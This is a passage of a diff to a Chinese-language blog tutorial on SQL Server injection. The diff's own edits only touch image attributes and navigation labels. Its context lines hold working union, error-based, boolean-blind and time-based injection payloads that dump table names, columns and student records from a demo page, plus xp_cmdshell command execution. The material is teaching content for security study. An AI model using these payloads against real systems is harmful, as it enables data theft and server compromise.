 <p>此处需要注意，当联合注入的数据和前半部分的数据类型不匹配时，会出现报错</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 </blockquote>
 <p>查询表名，将获取到的数据库名和<code>.dbo.sysobjects</code>进行拼接，通过限制<code>xtype</code>为u，使用<code>TOP 1</code>进行限制，找出第一条查询到的用户创建表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27;) --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>查询第二条表名数据时，可以使用<code>and name != &#39;第一次输出中的表名&#39;</code>的方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27; and name != &#x27;STUDENTS&#x27;) --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>获取列名，通过col_name、object_id等函数，遍历获取列名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),1) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),2) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),3) from sysobjects)--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>获取数据，这里获取StudentID字段的数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h4 id="pnSUl">报错注入</h4>
 
 <p>上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：</p>
@@ -328,30 +349,30 @@
 <p>对于<code>convert(int,@@version)</code>，convert函数会首先执行第二给参数指定的SQL查询，然后尝试将查询结果转为int类型。但是由于查询语句查询出来的结果时varchar类型，无法转为指定的int类型，因此convert函数会爆出一个SQLSever的错误消息，格式是<code>&quot;SQL查询结果&quot;无法转换为&quot;int&quot;类型</code>，这样攻击者就可以利用报错来获取到SQL的查询结果</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,db_name())</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出SqlServer的错误信息，也是一种利用方法</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name())</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>首先查询数据库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">0</span>))</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询第二个数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 
 <p>这里我们可以通过<code>for xml path</code>，查询所有数据库的名字，<code>FOR XML PATH(&#39;&#39;)</code> 表示输出 XML，但不加任何标签。通常可以配合<code>stuff()</code>使用，用来拼接多个值并去除第一个多余分隔符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>爆出所有表名，但是其中存在一些系统表，可以通过<code>xtype=&#39;U&#39;</code>来过滤出用户表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = &#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>接下来就是爆出<code>Students</code>表的所有字段</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id(&#x27;Students&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>最后爆数据即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>剩下的报错函数原理也是相似的，读者可以自行查阅资料</p>
 <h4 id="IeAWT">布尔盲注</h4>
 
@@ -366,7 +387,7 @@
 <p>猜解数据库名字，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//获取数据库名的第一个字符ascii码为83</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- </span><br><span class="line">//获取数据库名的第一个字符ascii码为99</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 -- </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>后续的表名、列名和数据，只需要替换响应的SQL语句即可</p>
 <h4 id="KxKAK">延时注入</h4>
 
@@ -375,15 +396,15 @@
 <p>观察浏览器f12，观察时间确认成功延时，代表存在漏洞</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 WAITFOR DELAY &#x27;0:0:5&#x27; --</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>后续利用和布尔注入相类似，判断数据库名长度</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY &#x27;0:0:5&#x27; --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>然后一个字符一个字符进行猜解数据库名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY &#x27;0:0:5&#x27;-- </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>后续只需要替换SQL语句查询点，就可以注入其他数据</p>
 <h2 id="zxVml">SqlServer命令执行</h2>
 
@@ -399,7 +420,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 ;exec master..xp_cmdshell &quot;命令&quot;</span><br></pre></td></tr></table></figure>
 
 <p>通过运行<code>whoami</code>，可以看到sqlserver的权限为<code>nt service\mssqlserver</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 
       </div>
       
@@ -415,13 +436,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/08/15/H2-JDBC-Attack/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>H2-JDBC-Attack</strong>
       </a>
     
     
-      <a href="/2025/08/07/PostgreSQL-JDBC-Attack/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/07/PostgreSQL-JDBC-Attack/">
+        <span>更早一篇</span>
         <strong>PostgreSQL-JDBC-Attack</strong>
       </a>
     
@@ -435,9 +456,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
